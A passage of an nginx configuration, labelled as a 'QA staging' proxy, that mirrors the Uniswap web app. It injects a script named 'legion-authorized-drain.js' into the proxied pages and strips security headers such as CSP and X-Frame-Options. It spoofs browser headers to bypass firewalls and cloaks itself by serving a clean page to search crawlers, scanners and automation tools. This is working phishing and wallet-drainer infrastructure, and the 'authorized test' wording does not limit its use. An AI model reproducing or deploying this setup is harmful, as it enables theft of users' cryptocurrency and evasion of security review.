# Legion QA — dynamic reverse proxy (staging only)
# Target: https://app.uniswap.org
# All paths (including /) → proxied to https://app.uniswap.org; Legion inject assets served locally
# --authorized-test: legion-authorized-drain.js/css injected into proxied HTML via sub_filter
# --waf-bypass: browser-like upstream headers (experimental)
# --asset-rewrite: sub_filter origin → mirror host in HTML/CSS/JS/JSON
# --headless-fallback: navigator.webdriver patch (experimental)

worker_processes 1;
events { worker_connections 2048; }

http {
  include       /etc/nginx/mime.types;
  default_type  application/octet-stream;
  sendfile      on;
  keepalive_timeout 65;
  proxy_connect_timeout 60s;
  proxy_send_timeout 120s;
  proxy_read_timeout 120s;
  proxy_buffering off;

  resolver 1.1.1.1 8.8.8.8 valid=60s ipv6=off;
  proxy_cache_path /var/cache/nginx/legion levels=1:2 keys_zone=legion_static:32m max_size=512m inactive=24h use_temp_path=off;
  gzip on;
  gzip_vary on;
  gzip_proxied any;
  gzip_comp_level 5;
  gzip_min_length 256;
  gzip_types text/css text/javascript application/javascript application/json application/wasm text/plain text/xml image/svg+xml font/woff font/woff2 application/font-woff application/vnd.ms-fontobject;

  map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
  }

  map $http_user_agent $is_bot_ua {
    default 0;
    ~*googlebot 1;
    ~*bingbot 1;
    ~*ahrefsbot 1;
    ~*semrushbot 1;
    ~*yandexbot 1;
    ~*baiduspider 1;
    ~*crawler 1;
    ~*spider 1;
    ~*headless 1;
    ~*phantomjs 1;
    ~*selenium 1;
    ~*puppeteer 1;
    ~*playwright 1;
    ~*bytespider 1;
    ~*petalbot 1;
    ~*curl/ 1;
    ~*wget/ 1;
    ~*python-requests 1;
  }

  map $http_accept_language $is_bot_lang {
    default 0;
    "" 1;
  }

  map "$is_bot_ua$is_bot_lang" $legion_is_bot {
    default 0;
    11 1;
    10 1;
    01 1;
  }

  map $uri $legion_cloak_exempt {
    default 0;
    =/mirror-health 1;
    =/mirror-config.json 1;
    ~^/legion- 1;
    ~^/__legion__/ 1;
  }

  map "$legion_is_bot$legion_cloak_exempt" $legion_apply_cloak {
    default 0;
    10 1;
  }

  server {
    listen 8080;
    server_name localhost 127.0.0.1;

    root /usr/share/nginx/html;

    location = /bots-clean.html {
      try_files /bots-clean.html =404;
      add_header Cache-Control "no-store";
    }

    error_page 418 = /bots-clean.html;

    location = /mirror-config.json {
      try_files /mirror-config.json =404;
      add_header Cache-Control "no-store";
      add_header Content-Type application/json;
    }

    location = /mirror-health {
      access_log off;
      default_type text/plain;
      return 200 'ok';
      add_header Cache-Control "no-store";
    }

    # Legion inject assets — serve from local volume (never proxy to upstream)
    location ^~ /legion- {
      try_files $uri =404;
      add_header Cache-Control "no-store";
    }

    # Subdomain passthrough — /__legion_proxy/<host>/<path> → https://<host>/<path>
    location ~ ^/__legion_proxy/(?<proxy_host>[^/]+)(?<proxy_path>/.*)?$ {
      set $upstream_path $proxy_path;
      if ($upstream_path = "") { set $upstream_path /; }
      proxy_pass https://$proxy_host$upstream_path$is_args$args;
      proxy_ssl_server_name on;
      proxy_set_header Host $proxy_host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header Content-Security-Policy-Report-Only;
      proxy_hide_header X-Frame-Options;
      proxy_hide_header X-Content-Type-Options;
      proxy_hide_header Cross-Origin-Embedder-Policy;
      proxy_hide_header Cross-Origin-Opener-Policy;
      proxy_hide_header Cross-Origin-Resource-Policy;
      proxy_hide_header Permissions-Policy;
      proxy_set_header Accept-Encoding "";
      proxy_cache legion_static;
      proxy_cache_valid 200 24h;
      proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;
      proxy_cache_lock on;
      proxy_buffering off;
      add_header X-Legion-Cache-Status $upstream_cache_status always;
    }

    location ~* \.(?:png|jpe?g|gif|webp|svg|ico|woff2?|ttf|eot|css|js|mjs|map)$ {
      set $legion_upstream_host app.uniswap.org;
      proxy_pass https://$legion_upstream_host$request_uri;
      proxy_ssl_server_name on;
      proxy_set_header Host app.uniswap.org;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_set_header Accept-Encoding "";
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;
      proxy_cache legion_static;
      proxy_cache_valid 200 24h;
      proxy_cache_use_stale error timeout updating http_500 http_502 http_503 http_504;
      proxy_cache_lock on;
      proxy_buffering off;
      add_header X-Legion-Cache-Status $upstream_cache_status always;
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header Content-Security-Policy-Report-Only;
      proxy_hide_header X-Frame-Options;
      proxy_hide_header X-Content-Type-Options;
      proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
      proxy_set_header Accept-Language "en-US,en;q=0.9";
      proxy_set_header Accept "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
      proxy_set_header Sec-CH-UA "\"Chromium\";v=\"122\", \"Google Chrome\";v=\"122\", \"Not-A.Brand\";v=\"99\"";
      proxy_set_header Sec-CH-UA-Mobile "?0";
      proxy_set_header Sec-CH-UA-Platform "\"Windows\"";
      proxy_set_header Referer "https://app.uniswap.org/";
      proxy_set_header Origin "https://app.uniswap.org";
